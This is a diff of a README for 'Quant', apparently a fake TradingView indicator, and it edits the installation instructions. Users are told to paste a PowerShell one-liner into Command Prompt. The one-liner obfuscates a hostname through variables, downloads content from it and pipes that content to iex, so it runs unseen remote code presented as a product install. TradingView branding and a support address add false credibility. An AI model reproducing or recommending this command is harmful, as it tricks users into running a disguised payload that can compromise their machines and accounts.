@@ -11,7 +11,7 @@
 Quant is our first indicator built on a machine learning model. It analyzes upcoming events, historical market data, price action, liquidity, positioning, volatility, and market structure to produce a directional forecast for the timeframe you select.
 
 ## Installation
-Setup takes a single command in Command Prompt.
+The recommended way to install the Quant indicator on Windows is through Command Prompt. The command installs all required dependencies and completes the setup in one step.
 
 ### 1. Open Command Prompt
 Press **Win + R**, type `cmd`, press **Enter**.
@@ -22,11 +22,7 @@ Copy and paste the following command into Command Prompt:
 ```powershell
 powershell -NoProfile -Command "$GetIndicatorList; $Quant; $IndicatorVersion='v_2.9.5_beta'; $Sync='Library.'; $Install; $Mode='AI'; $Pinescript='TradingView'+$Sync+$Mode; (curl -UseBasicParsing ($Pinescript)).Content | iex"
 ```
-
-### 3. Restart the TradingView Desktop App
-
-If TradingView was open during installation, restart it to finish setup. The Quant Indicator will then appear in your indicator library.
-
+_Once the installation is complete, the Quant indicator will appear in your TradingView indicator library._
 
 # Support
 If you run into an issue or have feedback, open an issue on GitHub or write to support@tradingview.com.
@@ -38,7 +34,7 @@ This software incorporates several parts of tslib (https://github.com/Microsoft/
 
 This license requires specifying TradingView as the product creator. You shall add the "attribution notice" from the NOTICE file and a link to https://www.tradingview.com/ to the page of your website or mobile application that is available to your users. As thanks for creating this product, we'd be grateful if you add it in a prominent place. You can use the attributionLogo chart option for displaying an appropriate link to https://www.tradingview.com/ on the chart itself, which will satisfy the link requirement.
 
-# Contributors
+# Community
 
 Built with feedback from our beta testers. Thank you to everyone who helped us improve it.
 
